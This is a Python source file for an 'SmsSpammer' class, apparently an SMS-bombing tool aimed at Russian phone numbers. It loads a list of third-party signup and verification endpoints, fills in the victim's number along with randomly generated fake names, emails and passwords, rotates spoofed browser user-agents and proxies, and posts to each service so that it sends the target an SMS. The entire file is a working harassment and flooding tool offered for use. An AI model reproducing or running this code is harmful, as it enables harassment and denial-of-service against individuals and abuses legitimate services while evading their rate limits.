import random
import json
import requests
import time
import pkgutil


class SmsSpammer:


    def __init__(self, phone ):
        self.phoneNumber = self.make7phone(phone)
        self.proxies=None
        self.timeout=10
        self.timeoutCounter = 0

    def make7phone(self, phone):
            if phone[0] == '+':
                    phone = phone[1:]
            elif phone[0] == '8':
                    phone = '7'+phone[1:]
            elif phone[0] == '9':
                    phone = '7'+phone
            return phone


    def setProxies(self, new_proxies):
        if self.proxies != new_proxies:
            self.timeoutCounter = 0
            self.proxies = new_proxies

    def addparams(self):
        self.name = ''
        for x in range(12):
            self.name = self.name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
            self.password = self.name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
            self.email = "{}@gmail.com".format(self.name)
        
        headers = [
                {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:76.0) Gecko/20100101 Firefox/76.0',
                    'Accept': '*/*'
                },
                {
                "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0",
                'Accept': '*/*'
                },
                {
                "User-Agent": "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0",
                'Accept': '*/*'
                },
                {
                'User-Agent': 'Mozilla/5.0 (Windows NT 3.1; rv:76.0) Gecko/20100101 Firefox/69.0',
                'Accept': '*/*'
                },
                {
                "User-Agent": "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/76.0",
                'Accept': '*/*'
                },
                ]
        self.header = random.choice(headers)

        services = pkgutil.get_data('boss','data/servicesList.json').decode("utf-8")
        services = services.replace("$phone$",self.phoneNumber)
        services = services.replace("$name$",self.name)
        services = services.replace("$email$",self.email)
        services = services.replace("$password$",self.password)
        self.servicesURLs = json.loads(services)
        
    def sendSMS(self, websiteData, proxy ):
        if proxy != None:
            proxy = {'http': "http://{}".format(proxy), 'https':"http://{}".format(proxy)}
        try:
             if websiteData["kind"] == "data":
                 requests.post(websiteData["url"], data=websiteData["data"], proxies=proxy, timeout=self.timeout, headers=self.header)
             elif websiteData["kind"] == "json":
                 requests.post(websiteData["url"], json=websiteData["data"], proxies=proxy, timeout=self.timeout, headers=self.header)
             elif websiteData["kind"] == "params":
                 requests.post(websiteData["url"], params=websiteData["data"], proxies=proxy, timeout=self.timeout, headers=self.header)

             return 1
        except Exception as e:
            self.timeoutCounter = self.timeoutCounter + 1
            return 2




    def startSending(self):
        self.addparams()
        successes = 0
        failures = 0
        for service in self.servicesURLs :
            proxy = None
            if self.proxies != None:
                proxy = random.choice(self.proxies)
            result = self.sendSMS(service, proxy)
            if result == 2:
                failures += 1
            if result == 1:
                successes += 1
        print("Успешно отосланно: "+str(successes)+", не получилось отослать:"+str(failures))
